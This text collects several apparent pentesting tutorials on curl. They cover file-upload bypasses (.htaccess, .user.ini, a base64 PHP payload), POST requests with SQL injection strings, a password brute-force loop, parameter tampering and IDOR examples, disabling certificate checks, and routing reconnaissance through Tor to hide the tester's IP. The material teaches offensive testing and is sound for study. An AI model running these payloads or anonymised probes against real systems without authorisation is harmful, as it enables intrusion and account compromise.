Server side validation is the only real protection. Never trust anything the browser sends. The MIME type can be spoofed. The filename can be manipulated. The extension can be changed.

A secure upload handler does all of these things. It generates a random filename instead of using the one provided by the user. It stores files outside the web root so they cannot be accessed directly. It checks the actual file content using a library like `finfo` rather than trusting the MIME type. It uses a whitelist of allowed extensions rather than a blacklist of blocked ones. It limits the file size. It scans uploaded files for malware.

If any of these protections is missing, the upload form might be vulnerable.

---

## Common Questions

**Q. The upload returned a path but I get 404 when accessing the file. What now?**

The file might be stored outside the web root and served through a script. The filename in the response might be different from the original. The file might have been renamed with a random string. Check the response carefully for any identifier you can use.

**Q. The server renames my file. Is the vulnerability closed?**

Not necessarily. If the server renames the file but keeps the dangerous extension, you can still execute it if you can find the new name. Some servers return the new filename in the upload response. Others place it in a predictable pattern you can guess.

**Q. What if the server blocks all executable extensions?**

Try configuration files. `.htaccess` files can make Apache treat `.jpg` files as PHP. `.user.ini` files can do the same for PHP-FPM. These attacks only work if the server runs Apache or PHP-FPM.

**Q. I found an upload form but it requires authentication. Is it still useful?**

Yes. If you have valid credentials, test the upload form after logging in. Authenticated users often have fewer restrictions on what they can upload. Admin panels are especially dangerous because they often allow any file type.

**Q. How do I test an upload form that expects JSON instead of multipart form data?**

Some modern applications send files as base64 encoded strings inside JSON bodies. This requires a different approach with `-d` instead of `-F`.

```bash
curl -X POST https://api.target.com/upload \
  -H "Content-Type: application/json" \
  -d '{"filename":"test.php","content":"PD9waHAgZWNobyAiVVBMT0FEX09LIjsgPz4="}'
```

The base64 string decodes to your PHP payload.

# curl -X POST and -d. Send Data To The Server.

`curl -X POST` changes the request method from GET to POST. `curl -d` adds data to the body of that request. Together they let you submit forms, call APIs, and test login pages directly from the terminal.

---

## What Is A POST Request

A POST request sends data to the server. While GET asks "give me this page", POST says "here is some data, process it". Every login form uses POST. Every search box uses POST. Every contact form uses POST. Every API that creates or updates something uses POST.

The data in a POST request goes in the body. It does not appear in the URL. It is not visible in browser history. It is not logged by default in server access logs.

---

## The Basic Syntax

```bash
curl -X POST -d "key=value" https://target.com/endpoint
```

The `-X` flag sets the HTTP method. The `-d` flag adds data to the request body. You can use `-d` multiple times to send multiple fields.

```bash
curl -X POST -d "name=mhak" -d "age=20" -d "skill=hacking" https://postman-echo.com/post
```

---

## Different Ways To Send Data

### Form Data

This is the default format. The server receives it like a normal HTML form submission.

```bash
curl -X POST -d "username=admin&password=test123" https://target.com/login
curl -X POST -d "search=hacking+tools&category=web" https://target.com/search
curl -X POST -d "name=Mhak&email=mhak@test.com&message=hello" https://target.com/contact
```

### JSON Data

APIs expect JSON. You must add the Content-Type header to tell the server what format you are sending.

```bash
curl -X POST -d '{"username":"admin","password":"test123"}' \
  -H "Content-Type: application/json" \
  https://api.target.com/login
```

### XML Data

Some older APIs and SOAP services use XML.

```bash
curl -X POST -d '<user><name>Mhak</name><role>admin</role></user>' \
  -H "Content-Type: application/xml" \
  https://target.com/api
```

### Raw Text

You can send any string as the body. No key-value structure needed.

```bash
curl -X POST -d "just some plain text here" https://postman-echo.com/post
```

---

## What You Can Do With POST

### Submit Login Forms

Every website with a login page sends credentials via POST. You can test authentication directly.

```bash
curl -X POST -d "email=admin@test.com&password=admin123" https://target.com/login
```

### Test Registration Pages

Registration forms also use POST. You can check what the server returns after creating a user.

```bash
curl -X POST -d "name=test&email=test@test.com&password=test123&confirm=test123" https://target.com/register
```

### Call APIs

REST APIs use POST for creating resources. You can interact with any API endpoint.

```bash
curl -X POST -d '{"title":"New Post","content":"Hello World"}' \
  -H "Content-Type: application/json" \
  https://api.target.com/posts
```

### Send Search Queries

Some search features use POST instead of GET. The search term goes in the body.

```bash
curl -X POST -d "q=cybersecurity+tools" https://target.com/search
```

---

## How To See What You Sent

Use `-v` to see the full request including the body you sent and the response headers.

```bash
curl -v -X POST -d "test=hello" https://postman-echo.com/post
```

Look at the lines starting with `>`. They show your request headers. The Content-Type header tells you what format curl chose. The Content-Length header tells you how much data you sent.

---

## POST vs GET

| Feature | GET | POST |
|---------|-----|------|
| Where data goes | URL query string | Request body |
| Visible in URL | Yes | No |
| Visible in browser history | Yes | No |
| Visible in server logs | Yes | Usually not |
| Maximum length | Around 2000 characters | No practical limit |
| Bookmarkable | Yes | No |
| Used for | Retrieving data | Sending data |

---

## Attack Scenarios

### SQL Injection via POST

Login forms are the most common target. The username and password fields are sent via POST. If the server does not sanitize input, SQL injection is possible.

```bash
curl -X POST -d "user=admin' OR '1'='1&pass=test" https://target.com/login
curl -X POST -d "user=admin'--&pass=test" https://target.com/login
```

### Brute Force via POST

You can test multiple passwords against a login form using a loop.

```bash
for pass in password123 admin123 letmein 123456; do
  echo "Trying: $pass"
  curl -s -X POST -d "user=admin&password=$pass" https://target.com/login | grep -i "welcome\|dashboard"
done
```

### Parameter Tampering

Some applications trust POST data blindly. You can change prices, roles, or permissions.

```bash
curl -X POST -d "product_id=123&price=1&admin=true" https://target.com/checkout
```

### IDOR via POST

If user IDs are sequential, you can access other users' data.

```bash
curl -X POST -d "user_id=124&action=delete" https://target.com/profile/manage
```

---

## Common Mistakes

### Forgetting Content-Type With JSON

If you send JSON without the header, the server may not parse it correctly.

```bash
# Wrong
curl -X POST -d '{"key":"value"}' https://api.target.com/endpoint

# Correct
curl -X POST -d '{"key":"value"}' -H "Content-Type: application/json" https://api.target.com/endpoint
```

### Using GET For Sensitive Data

Never send passwords or tokens in the URL. They will appear in server logs and browser history.

### Not URL Encoding Special Characters

If your data contains `&` or `=` symbols, use `--data-urlencode` instead of `-d`.

```bash
curl -X POST --data-urlencode "message=Hello & Welcome" https://target.com/submit
```

---

## Quick Reference

| Command | What It Does |
|---------|--------------|
| `curl -X POST -d "key=val" URL` | Send form data |
| `curl -X POST -d '{"key":"val"}' -H "Content-Type: application/json" URL` | Send JSON |
| `curl -X POST -d "key1=val1" -d "key2=val2" URL` | Send multiple fields |
| `curl -X POST --data-urlencode "key=val with spaces" URL` | Send with encoding |
| `curl -v -X POST -d "key=val" URL` | See full request |



# curl -k. Trust No Certificate.

`curl -k` tells curl to skip SSL certificate verification. When a server presents an expired certificate, a self-signed certificate, or a certificate with the wrong hostname, curl normally rejects the connection. With `-k`, curl connects anyway. No questions asked.

This is useful for testing. This is dangerous for everything else.

---

## What Is SSL Certificate Verification

Every HTTPS connection begins with a handshake. The server shows its certificate. Curl checks it. Is it signed by a trusted authority? Has it expired? Does the hostname match? If any check fails, curl refuses to connect. This protects you from connecting to fake or compromised servers.

`-k` disables all of these checks. Curl will connect to any server regardless of what its certificate says. Expired. Self-signed. Wrong hostname. Completely fake. Curl does not care.

---

## The Basic Command

```bash
curl -k https://expired.badssl.com/
```

Without `-k`, this command fails with an SSL error. The certificate on `expired.badssl.com` is deliberately expired. With `-k`, the page loads normally. Curl sees the expired certificate and shrugs.

---

## When SSL Errors Happen

An SSL error can happen for several reasons. The certificate has passed its expiry date and the server administrator forgot to renew it. The certificate is self-signed and not issued by a trusted certificate authority — common on internal servers and development environments. The hostname on the certificate does not match the hostname you are connecting to — the certificate says `example.com` but you connected to `www.example.com`. The certificate chain is incomplete and a required intermediate certificate is missing.

In all of these cases, `-k` makes the error go away by disabling the check entirely.

---

## Practical Examples

### Expired Certificate

A production site whose certificate expired yesterday. You need to access it for testing. The administrator is working on renewal but you cannot wait.

```bash
curl -k https://expired.badssl.com/
```

### Self-Signed Certificate

An internal development server that uses a self-signed certificate. It was never meant to be accessed over the public internet. Curl refuses the connection because the certificate authority is not recognized.

```bash
curl -k https://localhost:8443/admin
curl -k https://192.168.1.100/dashboard
```

### Wrong Hostname

A server configured with a certificate for `example.com` but you are accessing it via its IP address or a different domain name. The certificate does not match. The connection is rejected.

```bash
curl -k https://192.168.0.50/login
```

### Debugging SSL Problems

You are investigating an SSL configuration issue. You need to see the full response despite the certificate problem.

```bash
curl -k -v https://problematic-server.com
```

---

## Practice With Badssl

Badssl.com provides deliberately broken SSL configurations for testing. Each subdomain demonstrates a different certificate problem.

```bash
# Expired certificate
curl -k https://expired.badssl.com/

# Self-signed certificate
curl -k https://self-signed.badssl.com/

# Wrong hostname
curl -k https://wrong.host.badssl.com/

# Untrusted root certificate
curl -k https://untrusted-root.badssl.com/

# Incomplete certificate chain
curl -k https://incomplete-chain.badssl.com/
```

Each of these will fail without `-k` and succeed with it.

---

## The Danger

`-k` disables the primary mechanism that protects you from man-in-the-middle attacks. When you use `-k`, you lose the ability to verify that the server you are talking to is the real server and not an attacker pretending to be it.

If an attacker sits between you and the server, they can present a fake certificate. Without `-k`, curl detects this and refuses to connect. With `-k`, curl connects and sends your data directly to the attacker. Your passwords. Your session tokens. Your API keys. Everything.

Never use `-k` with sensitive data. Never use `-k` on banking sites. Never use `-k` on payment gateways. Never use `-k` when entering passwords or personal information.

---

## Safe Uses

Use `-k` on local development servers that you control. Use `-k` on internal network devices that use self-signed certificates. Use `-k` for penetration testing when you have explicit permission from the server owner. Use `-k` for security research on deliberately broken SSL configurations like badssl.com.

Do not use `-k` on any production website that handles real user data. Do not use `-k` as a permanent solution for SSL errors. If a certificate is broken, fix it. Do not make `-k` a habit.

---

## Alternatives To -k

Instead of using `-k` globally, use `--cacert` to specify a specific certificate authority file that you trust.

```bash
curl --cacert /path/to/custom-ca.crt https://internal-server.com
```

This adds your custom CA to the trust store without disabling verification entirely. It is more secure than `-k` because curl still verifies the certificate against a known authority.

---

## Quick Reference

| Command | What It Does |
|---------|--------------|
| `curl -k URL` | Skip all SSL verification |
| `curl -k -v URL` | Skip verification and show details |
| `curl --cacert ca.crt URL` | Add custom CA, verify normally |
| `curl --insecure URL` | Same as `-k` (long form) |

# Tor + CURL. Anonymous Reconnaissance.

Tor hides your real IP address. Curl sends requests. Together they let you perform reconnaissance and testing without revealing who you are or where you are located.

This guide covers everything. Installing Tor. Starting Tor. Using Tor with Curl. Fixing common errors. Bypassing geo-blocks. And staying safe while testing.

---

## Why Tor Matters For Pentesting

Every request you send from your terminal carries your real IP address. The target server logs it. Cloudflare logs it. Your ISP logs it. If you are testing without permission, that IP address leads directly back to you.

Tor routes your traffic through three random nodes around the world. The target server sees the IP of the last node — the exit relay — not your real IP. Your ISP sees you connected to Tor, but cannot see what you are doing. The target sees a request from some random country, but cannot trace it back to you.

This is not a license to attack without permission. This is a safety layer for legitimate security testing. Always have authorization before testing any system you do not own.

---

## Installing Tor

### Linux (Debian/Ubuntu)
```bash
sudo apt update
sudo apt install tor -y
```

### Linux (Fedora)
```bash
sudo dnf install tor -y
```

### Termux (Android)
```bash
pkg install tor -y
```

### macOS
```bash
brew install tor
```

---

## Starting Tor

The simplest way to start Tor is in the background.

```bash
tor &
```

Wait about ten seconds for Tor to establish a circuit. You will see output similar to this when it is ready.

```
[notice] Tor has successfully opened a circuit.
```

If you see this line, Tor is connected and ready to use.

To stop Tor, run:

```bash
sudo killall tor
```

---

## Checking If Tor Is Running

Three ways to verify Tor is active.

### Port Check
```bash
ss -tlnp | grep 9050
```
If port 9050 is in the LISTEN state, Tor is running. If the output is empty, Tor is not running.

### Process Check
```bash
ps aux | grep -v grep | grep tor
```
If you see the tor process, it is active.

### One-Liner Status
```bash
ss -tlnp | grep -q 9050 && echo "TOR IS ON" || echo "TOR IS OFF"
```

---

## Using Tor With Curl

Once Tor is running, route your curl requests through it using the SOCKS5 proxy flag.

```bash
curl --socks5 127.0.0.1:9050 https://check.torproject.org/
```

The response should contain the words "Congratulations. This browser is configured to use Tor." Your IP address shown on the page will be a Tor exit node IP, not your real IP.

For everyday use, create a shortcut.

```bash
alias torcurl='curl --socks5 127.0.0.1:9050'
torcurl https://target.com
```

---

## Verifying Your Anonymity

Always verify that Tor is working before testing any target.

```bash
curl --socks5 127.0.0.1:9050 -s https://check.torproject.org/ | grep -o "Congratulations\|Sorry"
```

If the output is "Congratulations", you are anonymous. If the output is "Sorry" or empty, Tor is not routing your traffic.

Also check what IP the target sees.

```bash
curl --socks5 127.0.0.1:9050 -s https://api.ipify.org/
```

Compare this with your real IP.

```bash
curl -s https://api.ipify.org/
```

These two IPs must be different. If they are the same, Tor is not working.

---

## Common Errors And Fixes

### Error: Permission denied on /run/tor
```
[warn] Directory /run/tor cannot be read: Permission denied
```
**Fix:** Create the directory and assign ownership to your user.
```bash
sudo mkdir -p /run/tor
sudo chown $USER:$USER /run/tor
tor &
```

### Error: Could not connect to server via 127.0.0.1
```
curl: (7) Failed to connect to target.com port 443 via 127.0.0.1: Could not connect to server
```
**Fix:** Tor is not running. Start it first.
```bash
tor &
sleep 10
```

### Error: Tor exits immediately
```
[err] Reading config failed
```
**Fix:** Kill any existing Tor processes and try again.
```bash
sudo killall tor
tor &
```

### Tor runs but curl hangs
**Fix:** Wait longer for the circuit to establish. Tor can take 10 to 30 seconds on the first run.
```bash
tor &
sleep 15
curl --socks5 127.0.0.1:9050 https://check.torproject.org/
```

---

## Bypassing Geo-Blocks

Some websites block visitors from specific countries. If you are in Pakistan and trying to access a site that blocks Pakistani IPs, Tor helps.

```bash
curl --socks5 127.0.0.1:9050 https://geo-blocked-site.com
```

The target server sees the IP of the Tor exit node, which could be in Germany, the United States, or any other country. The geo-block never triggers.

To get an exit node from a specific country, configure Tor to use only exit nodes from that country. Edit the Tor configuration file.

```bash
sudo nano /etc/tor/torrc
```

Add these lines.

```
ExitNodes {us}
StrictNodes 1
```

Restart Tor.

```bash
sudo killall tor
tor &
```

Now all your traffic will exit through United States nodes.

---

## Other Uses Of Tor

### Downloading Files Anonymously

```bash
curl --socks5 127.0.0.1:9050 -O https://target.com/file.pdf
```

### Anonymous API Testing

```bash
curl --socks5 127.0.0.1:9050 -X POST -H "Content-Type: application/json" -d '{"key":"value"}' https://api.target.com/endpoint
```

### Reconnaissance Without Leaving Footprints

```bash
curl --socks5 127.0.0.1:9050 -s https://target.com | grep -oP '<!--.*?-->|href="\K[^"]*'
```

### Checking Dark Web .onion Sites

```bash
curl --socks5 127.0.0.1:9050 http://example.onion/
```

---

## Auto-Starting Tor On Boot

If you want Tor to start automatically every time your system boots, enable the systemd service.

```bash
sudo systemctl enable tor
sudo systemctl start tor
```

Check the status.

```bash
sudo systemctl status tor
```

---

## Important Warnings

Tor hides your IP address. It does not make illegal activity legal. Always have written permission before testing any system you do not own.

Tor slows down your connection. Each request travels through three random nodes around the world. This adds latency. Expect response times of several seconds for each request.

Tor exit nodes can see your traffic if it is not encrypted. Always use HTTPS with Tor. The exit node can see unencrypted HTTP traffic. With HTTPS, the exit node only sees the domain name, not the full URL or any data.

Your ISP can see that you are using Tor. They cannot see what you are doing, but they know you are connected to the Tor network. In some countries, this alone raises suspicion. Know the laws in your country.

---

## Quick Reference

| Task | Command |
|------|---------|
| Start Tor | `tor &` |
| Stop Tor | `sudo killall tor` |
| Check if running | `ss -tlnp \| grep 9050` |
| Use with curl | `curl --socks5 127.0.0.1:9050 URL` |
| Check anonymity | `curl --socks5 127.0.0.1:9050 https://check.torproject.org/` |
| See exit node IP | `curl --socks5 127.0.0.1:9050 https://api.ipify.org/` |
| Auto-start on boot | `sudo systemctl enable tor` |

